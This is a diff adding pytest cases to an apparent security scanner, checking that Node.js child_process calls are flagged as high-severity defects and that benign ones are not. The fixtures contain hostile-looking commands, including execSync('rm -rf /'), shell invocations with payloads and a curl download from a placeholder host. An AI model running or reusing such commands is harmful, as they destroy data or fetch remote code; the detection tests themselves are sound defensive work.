@@ -521,3 +521,32 @@ def test_scan_result_to_dict_carries_kind_installed_and_capabilities():
     # The response model accepts the new fields and defaults them for old cached dicts.
     assert "capabilities" in PublicScanResponse.model_fields
     assert json.dumps(data["capabilities"])
+
+
+# ── child_process calls through the module object (review fix) ───────────────
+# The bare import became a capability in this pass, so calls written as a method on
+# the module must be classified themselves: the inline one-liner and any alias.
+@pytest.mark.parametrize("code", [
+    "require('child_process').exec('id')\n",
+    "require('child_process').spawn('sh', ['-c', 'id'])\n",
+    "require('child_process').spawn('curl', ['-s', 'https://e.invalid/p', '-o', '/tmp/p'])\n",
+    "require('node:child_process').execSync('whoami')\n",
+    "require('child_process').spawn(\n  'sh',\n  ['-c', payload]\n)\n",
+    "const proc = require('child_process')\nproc.exec(cmd)\n",
+    "import * as childp from 'node:child_process'\nchildp.spawn('bash', ['-c', x])\n",
+    "import cpx from 'child_process'\ncpx.execSync('rm -rf /')\n",
+])
+def test_child_process_method_calls_stay_defects(code):
+    d = _defects(_scan(code, "index.js"))
+    assert any(f.name == "execSync / spawn (Node.js)" and f.severity in ("high", "critical")
+               for f in d), d
+
+
+@pytest.mark.parametrize("code", [
+    "require('child_process').spawn('node', [__dirname + '/cli.js'])\n",
+    "const proc = require('child_process')\nproc.spawnSync('git', ['rev-parse', 'HEAD'])\n",
+    "const proc = require('child_process')\nconst m = /a(b)/.exec(s)\nconst k = other.exec(s)\n",
+])
+def test_child_process_method_calls_benign_stay_capabilities(code):
+    assert not [f for f in _defects(_scan(code, "index.js"))
+                if f.severity in ("critical", "high", "medium")]
